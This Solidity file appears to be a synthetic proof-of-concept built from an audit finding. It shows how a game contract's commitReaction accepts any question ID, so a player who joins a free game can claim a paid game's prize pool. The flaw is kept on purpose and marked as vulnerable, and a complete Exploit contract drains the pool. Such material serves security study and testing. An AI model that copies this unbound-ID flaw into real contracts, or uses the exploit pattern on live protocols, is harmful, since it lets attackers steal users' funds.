// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Majority Protocol — commitReaction does not bind questionId to gameId
    (Cyfrin / Dacian, 2026-01-27 majority-protocol-v2.0, #65374)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: SessionManager.commitReaction only checks
    contestants[_gameId][msg.sender], then forwards arbitrary _questionId
    to the prompt strategy. The strategy keys reactions by questionId alone
    and never verifies the question belongs to _gameId. An attacker joins
    one free/cheap game, then participates (and can win/claim) in any
    other game's questions without paying that game's entry fee.

    Vulnerable lines preserved (@> VULN).
    Provenance: Engage-Protocol/engage-protocol @ cca0cb3
    Fixed: 62cafca / 01d5cc2 / f0e77f9.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public constant name = "USDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal prompt strategy — reactions keyed only by questionId (no gameId).
contract PromptStrategy {
    struct Reaction {
        bytes32 commit;
        uint256 timestamp;
        bool revealed;
        uint16 answer;
    }

    struct Question {
        uint256 gameId;
        address sessionManager;
        bool revealed;
    }

    mapping(uint256 => Question) public revealedQuestions;
    mapping(uint256 => mapping(address => Reaction)) public reactions;

    error QuestionNotRevealed(uint256 questionId);
    error OnlySessionManager(address expected, address actual);
    error AnswerAlreadyCommitted(address user, uint256 gameId, uint256 questionId);

    function revealQuestion(uint256 gameId, uint256 questionId, address sessionManager) external {
        revealedQuestions[questionId] =
            Question({gameId: gameId, sessionManager: sessionManager, revealed: true});
    }

    /// @dev Verbatim-shape commitReaction from MajorityChoicePrompt — no gameId↔questionId check.
    function commitReaction(uint256 _gameId, uint256 _questionId, bytes32 _commit, address _user) external {
        require(revealedQuestions[_questionId].revealed, QuestionNotRevealed(_questionId));
        require(
            revealedQuestions[_questionId].sessionManager == msg.sender,
            OnlySessionManager(revealedQuestions[_questionId].sessionManager, msg.sender)
        );
        Reaction storage r = reactions[_questionId][_user];
        require(r.timestamp == 0, AnswerAlreadyCommitted(_user, _gameId, _questionId));

        r.commit = _commit; // @> VULN: reaction stored by questionId only — no binding to caller's gameId
        r.timestamp = block.timestamp;
    }

    function hasCommitted(uint256 questionId, address user) external view returns (bool) {
        return reactions[questionId][user].timestamp != 0;
    }
}

contract SessionManager {
    enum SessionState {
        Created,
        Ongoing,
        Ended,
        Cancelled,
        Concluded
    }

    struct GamePool {
        uint256 ticketPrice;
        uint256 totalCollectedAmount;
        address token;
    }

    struct Game {
        SessionState state;
        address creator;
        address rewardStrategy; // unused in synthetic claim path
    }

    mapping(uint256 => Game) public games;
    mapping(uint256 => GamePool) public gamePools;
    mapping(uint256 => mapping(address => bool)) public contestants;
    mapping(uint256 => address[]) public winners;
    mapping(uint256 => mapping(address => bool)) public hasClaimed;
    mapping(uint256 => uint256) public questionOfGame; // gameId => questionId (for legit path)
    mapping(uint256 => uint256) public gameOfQuestion; // reverse (for fix comparison only)
    PromptStrategy public prompt;
    uint256 public nextGameId = 1;
    uint256 public nextQuestionId = 1;

    error NotJoined(address player, uint256 gameId);

    constructor(PromptStrategy _prompt) {
        prompt = _prompt;
    }

    function createGame(uint256 ticketPrice, address token) external returns (uint256 gameId) {
        gameId = nextGameId++;
        games[gameId] = Game({state: SessionState.Created, creator: msg.sender, rewardStrategy: address(0)});
        gamePools[gameId] =
            GamePool({ticketPrice: ticketPrice, totalCollectedAmount: 0, token: token});
        uint256 qid = nextQuestionId++;
        questionOfGame[gameId] = qid;
        gameOfQuestion[qid] = gameId;
    }

    function joinGame(uint256 _gameId) external {
        GamePool storage pool = gamePools[_gameId];
        if (pool.ticketPrice > 0) {
            MockToken(pool.token).transferFrom(msg.sender, address(this), pool.ticketPrice);
            pool.totalCollectedAmount += pool.ticketPrice;
        }
        contestants[_gameId][msg.sender] = true;
    }

    function startGame(uint256 _gameId) external {
        games[_gameId].state = SessionState.Ongoing;
        prompt.revealQuestion(_gameId, questionOfGame[_gameId], address(this));
    }

    /// @dev Verbatim-shape SessionManager.commitReaction — only checks join on _gameId.
    function commitReaction(uint256 _gameId, uint256 _questionId, bytes32 _commit) external {
        require(games[_gameId].state == SessionState.Ongoing, "not ongoing");
        require(contestants[_gameId][msg.sender], NotJoined(msg.sender, _gameId));
        // FIX: require(gameOfQuestion[_questionId] == _gameId, "question not in game");
        prompt.commitReaction(_gameId, _questionId, _commit, msg.sender);
    }

    /// @dev Conclude and assign winners (simulates assertResults + conclude).
    function concludeWithWinners(uint256 _gameId, address[] calldata _winners) external {
        winners[_gameId] = _winners;
        games[_gameId].state = SessionState.Concluded;
    }

    /// @dev Winner claims full prize pool share (100% to sole winner).
    function claimRewards(uint256 _gameId, uint256 position) external {
        require(games[_gameId].state == SessionState.Concluded, "not concluded");
        require(winners[_gameId][position] == msg.sender, "not winner");
        require(!hasClaimed[_gameId][msg.sender], "claimed");
        hasClaimed[_gameId][msg.sender] = true;
        uint256 prize = gamePools[_gameId].totalCollectedAmount;
        gamePools[_gameId].totalCollectedAmount = 0;
        MockToken(gamePools[_gameId].token).transfer(msg.sender, prize);
    }
}

contract Victim {
    MockToken public tok;
    SessionManager public sm;

    constructor(MockToken _tok, SessionManager _sm) {
        tok = _tok;
        sm = _sm;
    }

    function fundAndJoin(uint256 gameId, uint256 fee) external {
        tok.approve(address(sm), fee);
        sm.joinGame(gameId);
    }
}

contract FreeRider {
    SessionManager public sm;
    MockToken public tok;

    constructor(SessionManager _sm, MockToken _tok) {
        sm = _sm;
        tok = _tok;
    }

    function joinFree(uint256 freeGameId) external {
        sm.joinGame(freeGameId); // ticketPrice == 0
    }

    /// @dev Join free game, commit against paid game's questionId.
    function freeRideCommit(uint256 freeGameId, uint256 paidQuestionId, bytes32 commit) external {
        sm.commitReaction(freeGameId, paidQuestionId, commit);
    }

    function claim(uint256 paidGameId) external {
        sm.claimRewards(paidGameId, 0);
    }
}

contract Exploit {
    MockToken public tok; // CREATE 1
    PromptStrategy public prompt; // CREATE 2
    SessionManager public sm; // CREATE 3
    Victim public victim; // CREATE 4
    FreeRider public attacker; // CREATE 5

    uint256 public constant PAID_FEE = 10 ether;
    uint256 public constant FREE_GAME = 1;
    uint256 public constant PAID_GAME = 2;

    constructor() {
        tok = new MockToken();
        prompt = new PromptStrategy();
        sm = new SessionManager(prompt);
        victim = new Victim(tok, sm);
        attacker = new FreeRider(sm, tok);
    }

    function run() external {
        // Game 1: free (attacker only joins this).
        sm.createGame(0, address(tok));
        // Game 2: paid (victim funds the prize pool).
        sm.createGame(PAID_FEE, address(tok));

        // Victim pays entry fee for paid game.
        tok.mint(address(victim), PAID_FEE);
        victim.fundAndJoin(PAID_GAME, PAID_FEE);
        require(tok.balanceOf(address(sm)) == PAID_FEE, "pool");

        // Start both games so questions are revealed.
        sm.startGame(FREE_GAME);
        sm.startGame(PAID_GAME);

        uint256 paidQ = sm.questionOfGame(PAID_GAME);
        require(paidQ != sm.questionOfGame(FREE_GAME), "distinct questions");

        // Attacker joins FREE game only (pays nothing), never joins paid game.
        attacker.joinFree(FREE_GAME);
        require(!sm.contestants(PAID_GAME, address(attacker)), "must not have joined paid");

        // Cross-game commit: gameId=free, questionId=paid → succeeds (VULN).
        bytes32 commit = keccak256("free-ride");
        attacker.freeRideCommit(FREE_GAME, paidQ, commit);
        require(prompt.hasCommitted(paidQ, address(attacker)), "committed on paid question");

        // Attacker is declared winner of the paid game (they "played" without fee)
        // and claims the entire prize pool.
        address[] memory w = new address[](1);
        w[0] = address(attacker);
        sm.concludeWithWinners(PAID_GAME, w);
        attacker.claim(PAID_GAME);

        require(tok.balanceOf(address(attacker)) == PAID_FEE, "attacker claimed free");
        require(tok.balanceOf(address(sm)) == 0, "pool drained");
    }
}
